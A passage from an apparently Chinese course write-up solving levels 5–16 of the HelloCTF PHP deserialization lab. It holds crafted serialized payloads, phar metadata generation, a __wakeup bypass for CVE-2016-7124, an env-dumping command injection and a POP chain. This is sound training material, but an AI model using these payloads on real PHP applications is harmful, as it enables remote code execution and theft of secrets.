class="string">&#x27;i am bmjoker&#x27;</span>;</span><br><span class="line">    <span class="comment">//将自定义的归档元数据meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;bmjoker&quot;</span>); </span><br><span class="line">    <span class="comment">//停止缓冲对phar的写操作</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行代码会生成一个 phar.phar 文件在当前目录下，使用 winhex 打开</p>
<p><img src="/images/OfFKb20qvoKxnKxMO0jcWx1Eng8.png"></p>
<p>可以明显的看到 meta-data 是以序列化的形式存储的，有序列化数据必然会有反序列化操作，php 一大部分的文件系统函数在通过 phar:&#x2F;&#x2F;伪协议解析 phar 文件时，都会将 meta-data 进行反序列化</p>
<h1 id="Week7-4-实验-php-反序列化实践"><a href="#Week7-4-实验-php-反序列化实践" class="headerlink" title="*[Week7.4]实验:php 反序列化实践"></a>*[Week7.4]实验:php 反序列化实践</h1><p><em>反序列化靶场关卡名做了一些更改，更贴合实际</em></p>
<h2 id="反序列化靶场-Level1-4-等"><a href="#反序列化靶场-Level1-4-等" class="headerlink" title="[反序列化靶场]Level1-4 等"></a>[反序列化靶场]Level1-4 等</h2><p>详见<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/LuxwwbmMHiKrpVksAvRc3q1oniK#share-PbQVdvPlkoAUiLxdzu0cm0c5nf2">[Week7.1]php 反序列化绪论</a></p>
<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/Yf1ZwJVDfiXOFLka8Mocj9panFe#share-Yb4KdTUH6oQL2axrPrlcyqCVnpe">[Week7.2]魔术方法和基础漏洞举例</a></p>
<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/IaWEwOlPLiMnYYkdvxCcVDhJndb#share-HrQYdujKQolHKIxivYJc536Anif">[Week7.3]反序列化漏洞利用</a></p>
<h2 id="反序列化靶场-Level5-普通值规则"><a href="#反序列化靶场-Level5-普通值规则" class="headerlink" title="[反序列化靶场]Level5-普通值规则"></a>[反序列化靶场]Level5-普通值规则</h2><p>读题先,应该是用字符串的序列化给变量赋值.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 5 : 序列化规则 ---  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：各有千秋~ </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬 </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30 </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs </span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com </span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a_class</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a_value</span> = <span class="string">&quot;NSSCTF&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a_class</span>(); </span><br><span class="line"><span class="variable">$a_array</span> = <span class="keyword">array</span>(a=&gt;<span class="string">&quot;Hello&quot;</span>,b=&gt;<span class="string">&quot;CTF&quot;</span>); </span><br><span class="line"><span class="variable">$a_string</span> = <span class="string">&quot;NSSCTF&quot;</span>; </span><br><span class="line"><span class="variable">$a_number</span> = <span class="number">678470</span>; </span><br><span class="line"><span class="variable">$a_boolean</span> = <span class="literal">true</span>; </span><br><span class="line"><span class="variable">$a_null</span> = <span class="literal">null</span>; </span><br><span class="line"></span><br><span class="line">See How to serialize:</span><br><span class="line">a_object: O:<span class="number">7</span>:<span class="string">&quot;a_class&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;a_value&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;NSSCTF&quot;</span>;&#125;</span><br><span class="line">a_array: a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;&#125;</span><br><span class="line">a_string: s:<span class="number">6</span>:<span class="string">&quot;NSSCTF&quot;</span>;</span><br><span class="line">a_number: i:<span class="number">678470</span>;</span><br><span class="line">a_boolean: b:<span class="number">1</span>;</span><br><span class="line">a_null: N;</span><br><span class="line">Now your turn!</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$your_object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]); </span><br><span class="line"><span class="variable">$your_array</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); </span><br><span class="line"><span class="variable">$your_string</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;s&#x27;</span>]); </span><br><span class="line"><span class="variable">$your_number</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;i&#x27;</span>]); </span><br><span class="line"><span class="variable">$your_boolean</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]); </span><br><span class="line"><span class="variable">$your_NULL</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;n&#x27;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( </span><br><span class="line">    <span class="variable">$your_boolean</span> &amp;&amp;  </span><br><span class="line">    <span class="variable">$your_NULL</span> == <span class="literal">null</span> &amp;&amp; </span><br><span class="line">    <span class="variable">$your_string</span> == <span class="string">&quot;IWANT&quot;</span> &amp;&amp; </span><br><span class="line">    <span class="variable">$your_number</span> == <span class="number">1</span> &amp;&amp; </span><br><span class="line">    <span class="variable">$your_object</span>-&gt;a_value == <span class="string">&quot;FLAG&quot;</span> &amp;&amp; </span><br><span class="line">    <span class="variable">$your_array</span>[<span class="string">&#x27;a&#x27;</span>] == <span class="string">&quot;Plz&quot;</span> &amp;&amp; <span class="variable">$your_array</span>[<span class="string">&#x27;b&#x27;</span>] == <span class="string">&quot;Give_M3&quot;</span> </span><br><span class="line">)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You really know how to serialize?&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You really know how to serialize?</span><br></pre></td></tr></table></figure>

<p>我们直接按要求 payload,即得 flag:</p>
<p>自定义 o&#x3D;O:7:”a_class”:1:{s:7:”a_value”;s:4:”FLAG”;};&amp;</p>
<p>数组 a&#x3D;a:2:{s:1:”a”;s:3:”Plz”;s:1:”b”;s:7:”Give_M3”;};&amp;</p>
<p>字符串 s&#x3D;s:5:”IWANT”;&amp;</p>
<p>整型变量 i&#x3D;i:1;&amp;</p>
<p>布尔值 b&#x3D;b:1;&amp;</p>
<p>NULLn&#x3D;N;&amp;</p>
<p>(其中有的分号可以不加,写成这样也能运行通过;最后一个&amp;也可以不加,但全加上保持格式一致便于记忆)</p>
<p>o&#x3D;O:7:”a_class”:1:{s:7:”a_value”;s:4:”FLAG”;}&amp;</p>
<p>a&#x3D;a:2:{s:1:”a”;s:3:”Plz”;s:1:”b”;s:7:”Give_M3”;}&amp;</p>
<p>s&#x3D;s:5:”IWANT”;&amp;</p>
<p>i&#x3D;i:1;&amp;</p>
<p>b&#x3D;b:1;&amp;</p>
<p>n&#x3D;N&amp;</p>
<p><img src="/images/CoYZbHHJeoIOoJxNTQlcICLIn06.png"></p>
<h2 id="反序列化靶场-Level6-权限修饰规则"><a href="#反序列化靶场-Level6-权限修饰规则" class="headerlink" title="[反序列化靶场]Level6-权限修饰规则"></a>[反序列化靶场]Level6-权限修饰规则</h2><p>读题，发现本题是用反序列化创建新实例，并给有特殊权限的成员赋值，我们再来复习一下权限修饰</p>
<p>看题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 6 : 序列化规则_权限修饰 ---  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：各有千秋~特别注意的权限修饰符x </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬 </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30 </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs </span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com </span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">protectedKEY</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_key</span>; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_key; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">privateKEY</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_key</span>; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_key; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">See Carfully~</span><br><span class="line"><span class="keyword">protected</span><span class="string">&#x27;s serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D</span></span><br><span class="line"><span class="string">private&#x27;</span>s serialize: O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>privateKEY%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>privateKEY%<span class="number">00</span>private_key%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$protected_key</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;protected_key&#x27;</span>]); </span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;private_key&#x27;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$protected_key</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$private_key</span>))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$protected_key</span>-&gt;<span class="title function_ invoke__">get_key</span>() == <span class="string">&quot;protected_key&quot;</span> &amp;&amp; <span class="variable">$private_key</span>-&gt;<span class="title function_ invoke__">get_key</span>() == <span class="string">&quot;private_key&quot;</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;We Call it %00_Contr0l_Characters_NULL!&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按要求进行 payload:</p>
<p>protected_key&#x3D;O:12:”protectedKEY”:1:{s:16:”%00*%00protected_key”;s:13:”protected_key”;};&amp;private_key&#x3D;O:10:”privateKEY”:1:{s:23:”%00privateKEY%00private_key”;s:11:”private_key”;};&amp;</p>
<p>注意\x00 在这不会转化，要用 %00；大括号前的最后一个分号也不能丢!</p>
<p><img src="/images/M8rAbluBPo7WSvxdAUhc2X7hnxd.png"></p>
<h2 id="反序列化靶场-Level7-利用方法执行命令"><a href="#反序列化靶场-Level7-利用方法执行命令" class="headerlink" title="[反序列化靶场]Level7-利用方法执行命令"></a>[反序列化靶场]Level7-利用方法执行命令</h2><p>先读题,这里应该是要你用反序列化创建一个匿名实例，并调用它的方法</p>
<p>(匿名实例会在调用方法后立即销毁)</p>
<p><img src="/images/CeVEbqqpIoAcscxtRXDckXNhnQg.png"></p>
<p>这里应该是给类 flag 的成员变量 flag_command 赋一个命令，backdoor()函数会执行这个命令</p>
<p>我们尝试用 system 函数进行 payload,这里还是要注意这几个特别容易错的点</p>
<p>第一个是大括号前最后一个分号不能丢</p>
<p>第二个是 flag_command 作为字符串放在 eval 指令的括号内，最后一定也要加一个分号，否则不是一个完整的可执行语句</p>
<p>cat 命令无果，尝试 tac 运行通过(期间也尝试了别的命令执行函数，发现问题错在 cat 上)</p>
<p><img src="/images/W1KtbFqYuoeOamx5cgecfcjSnwd.png"></p>
<p><img src="/images/GqJXbfMeXom4s3xr5VEcgRennrb.png"></p>
<h2 id="反序列化靶场-Level8-GC-机制（UNSET-手动销毁）"><a href="#反序列化靶场-Level8-GC-机制（UNSET-手动销毁）" class="headerlink" title="[反序列化靶场]Level8-GC 机制（UNSET 手动销毁）"></a>[反序列化靶场]Level8-GC 机制（UNSET 手动销毁）</h2><p>关于 GC 机制，本题运用到的考点就是已被初始化的对象会在脚本全部执行结束后销毁，读题</p>
<p>这应该是有个 flag 变量，在每次 RELFLAG 类的对象创建时，它重置为 0 再加 1，每次被销毁时也 +1</p>
<p>我们必须让它在 check 函数执行之前达到 5.</p>
<p><img src="/images/G1oFbWGGTownZpxeXgmch0jrnCb.png"></p>
<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>思考了一下，程序运行结束后，我们创建的对象才会自动销毁，因为他们又不是匿名的，所以如果只考虑自动销毁 check 函数不得不于析构函数前执行</p>
<p>于是我们使用手动销毁，先同时创建五个变量，再同时销毁五个变量，flag 值自然就达到了 6，因为创建时就加了 1</p>
<p>post 提交:</p>
<p>code&#x3D;$a&#x3D;new RELFLAG();$b&#x3D;new RELFLAG();$c&#x3D;new RELFLAG();$d&#x3D;new RELFLAG();$e&#x3D;new RELFLAG();unset($a);unset($b);unset($c);unset($d);unset($e);</p>
<p>运行通过</p>
<p><img src="/images/OABTb1e4xofiiKxkbofca3I0nzc.png"></p>
<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>这里看了下别人的 payload</p>
<p>code&#x3D;unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));</p>
<p>这里要抓住 unserialize 函数 unserialize 本身就可以完成一个匿名对象的创建，且这个函数创建对象时，无论是匿名的，还是非匿名的，一般情况都不会执行构造函数</p>
<p>我们对最底层 new 创建的匿名对象序列化了以后，匿名对象在此处不再被引用(或者说起作用)了，就会立刻消失</p>
<p>而后面几层的 serialize 也同理，unserialize 函数创建的匿名对象被序列化了以后，其不再起作用了，立即消失又继续执行析构函数</p>
<p>而构造函数从始至终只在 new 处执行一次</p>
<h2 id="反序列化靶场-Level9-析构函数的后门"><a href="#反序列化靶场-Level9-析构函数的后门" class="headerlink" title="[反序列化靶场]Level9-析构函数的后门"></a>[反序列化靶场]Level9-析构函数的后门</h2><p>读题，题目和第七关非常相似，把手动调用的函数 backdoor 更换为了析构函数</p>
<p>还用 var 为成员赋值了(这里 var，public，不写，三种表达同一个意思)</p>
<p>外部的关卡介绍还提示 flag 在环境变量</p>
<p><img src="/images/HoXXbNQBSoa6Cnx8cZWcyZSvnPd.png"></p>
<p>这里我们反序列化的对象也是匿名对象，创建后立即销毁，我们尝试 payload:</p>
<p>o&#x3D;O:4:”FLAG”:1:{s:12:”flag_command”;s:11:”echo <code>env</code>;”;}</p>
<p>(输入原因，这里 env 原要被反引号括起来，反引号执行 lunix-env 指令来获取环境变量，由 echo 来回显)</p>
<p>即得旗帜</p>
<p><img src="/images/ZvOFbOwReoA7KVxxYj8cWulxnZe.png"></p>
<h2 id="反序列化靶场-Level10-wakeup"><a href="#反序列化靶场-Level10-wakeup" class="headerlink" title="[反序列化靶场]Level10-__wakeup()"></a>[反序列化靶场]Level10-__wakeup()</h2><p>先复习一下__wakeup()，这个函数在使用 unserialize 时先被调用,如果 unserialize 得到的对象有__wakeup()这个成员函数，则在 unserialize 执行以后自动执行这个函数.</p>
<p>拿到题目，这里应该是反序列化得到 FLAG 类的对象以后直接打印 flag 了.</p>
<p>我们按他的要求来，0 个成员变量就写 0，大括号空着，创一个对象</p>
<p>o&#x3D;O:4:”FLAG”:0:{}</p>
<p><img src="/images/OFtNb9ESdoXJU0xgzRWc6C02nFg.png"></p>
<p>函数执行，运行通过</p>
<p><img src="/images/DrmPbxar3olRSrxJS43cKU9Anrg.png"></p>
<h2 id="反序列化靶场-Level11-CVE-2016-7124-wakeup-漏洞"><a href="#反序列化靶场-Level11-CVE-2016-7124-wakeup-漏洞" class="headerlink" title="[反序列化靶场]Level11-CVE-2016-7124(wakeup 漏洞)"></a>[反序列化靶场]Level11-CVE-2016-7124(wakeup 漏洞)</h2><p>CVE-2016-7124 - PHP5 &lt; 5.6.25 &#x2F; PHP7 &lt; 7.0.10</p>
<p>阅读题目，找到核心信息:</p>
<p>在该漏洞中，当序列化字符串中对象属性(成员变量)的个数大于真实属性(成员变量)的个数时便会跳过__wakeup()的执行。</p>
<p>读代码，在对象摧毁时，flag 变量只要不等于 NULL，那么他们就会被执行</p>
<p><em>这里 flag 是全局变量，在 include 文件中仍可以被访问，里面可能存在 flag 的真实值</em></p>
<p><img src="/images/C6AGbActUomnVPxIXvrcWKOdnag.png"></p>
<p>我们尝试构造 payload:</p>
<p>o&#x3D;O:4:”FLAG”:1:{s:12:”flag_command”;s:11:”echo 123;”;}</p>
<p>让新构造出来的匿名对象内有一个多余的属性，则运行通过</p>
<p><img src="/images/SEAkbbO02oKSICxSluRcQFM6nLh.png"></p>
<h2 id="反序列化靶场-Level12-sleep"><a href="#反序列化靶场-Level12-sleep" class="headerlink" title="[反序列化靶场]Level12-__sleep()"></a>[反序列化靶场]Level12-__sleep()</h2><p>__sleep()是为序列化服务的.先来复习复习</p>
<blockquote>
<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。（serialize）<br>该方法必须返回一个数组: return array(‘属性 1’, ‘属性 2’, ‘属性 3’) &#x2F; return [‘属性 1’, ‘属性 2’, ‘属性 3’]。<br>数组中的属性名将决定哪些变量将被序列化，当属性被 static 修饰时，无论有无都无法序列化该属性。<br>注意：如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - %00 父类名称 %00 变量名 (%00 是 ASCII 值为 0 的空字符 null,在代码内我们也可以通过 “\0” - 注意在双引号中，PHP 才会解析转义字符和变量。)。<br>例如，父类 FLAG 的私有属性 private $f; 应该在子类的 __sleep() 方法中以 “\0FLAG\0f” 的格式返回。<br>如果该方法未返回任何内容，序列化会被制空，并产生一个 E_NOTICE 级别的错误。</p>
</blockquote>
<p>题中也给出来了如果我们将类 FLAG 给序列化,返回的是什么</p>
<p><img src="/images/BFjublVO5o5nKnxsJ5ZcJbD0nfh.png"></p>
<p><img src="/images/J3nZbT9KzoUNnQx8d96coh8Xnke.png"></p>
<p>读题，这里应该并不要我们写什么，他用 sleep 魔术方法控制了序列化时只序列化两个随机的和一个可控的成员变量，我们拼起来就行了(注意父类按要求访问)</p>
<p><img src="/images/FQDVbUiOYoZy1Qx7AvpclY9cnxf.png"></p>
<h2 id="反序列化靶场-Level13-toString"><a href="#反序列化靶场-Level13-toString" class="headerlink" title="[反序列化靶场]Level13-__toString()"></a>[反序列化靶场]Level13-__toString()</h2><p>先复习:本方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</p>
<p>读题，易知 echo $obj，将其视为字符串打印即得 flag</p>
<p><img src="/images/BPXybSq5vowZWzx4K1KcijGwnsb.png"></p>
<p>Payload:</p>
<p>o&#x3D;echo $obj;</p>
<p><img src="/images/QwgqbwlE6om0krxqEmHctnhWnCh.png"></p>
<h2 id="反序列化靶场-Level14-invoke"><a href="#反序列化靶场-Level14-invoke" class="headerlink" title="[反序列化靶场]Level14-__invoke()"></a>[反序列化靶场]Level14-__invoke()</h2><p>读题，与上题同理，按规则调用</p>
<p><img src="/images/WV3lbHmCxonDcZxaecRcOP8fnZb.png"></p>
<p><img src="/images/KufdbqxsbowPFMxDCTfcBhifnIh.png"></p>
<h2 id="反序列化靶场-Level16-POP-链构造"><a href="#反序列化靶场-Level16-POP-链构造" class="headerlink" title="[反序列化靶场]Level16-POP 链构造"></a>[反序列化靶场]Level16-POP 链构造</h2><p>读题，这里很明显类 A 是目的地，成员 a 得是 flag.php(题目说明了)，被包含进去了再打印</p>
<p>所以前两行很明显，是</p>
<p>$C1&#x3D;new A();</p>
<p>而且还要求</p>
<p>$C1-&gt;a&#x3D;flag.php;</p>
<p>紧接着 A 的 invoke 要用变量名加括号调用，正是 class B 的方式</p>
<p>我们应当创建第三四行:</p>
<p>$C2&#x3D;new B();</p>
<p>$C2-&gt;b&#x3D;$C1;</p>
<p>同理 return $f();要用 toString 执行,即得第五第六行</p>
<p>$C3&#x3D;new INIT();</p>
<p>$C3-&gt;name&#x3D;$C2;</p>
<p>我们反序列化的也应该是应执行 wakeup 的 $C3</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;a; </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;b; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$f</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">INIT</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeUp</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is awake!&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123; </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$C1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$C1</span>-&gt;a=flag.php;</span><br><span class="line"><span class="variable">$C2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$C2</span>-&gt;b=<span class="variable">$C1</span>;</span><br><span class="line"><span class="variable">$C3</span>=<span class="keyword">new</span> <span class="title function_ invoke__">INIT</span>();</span><br><span class="line"><span class="variable">$C3</span>-&gt;name=<span class="variable">$C2</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$C3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;最终payload: &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure>

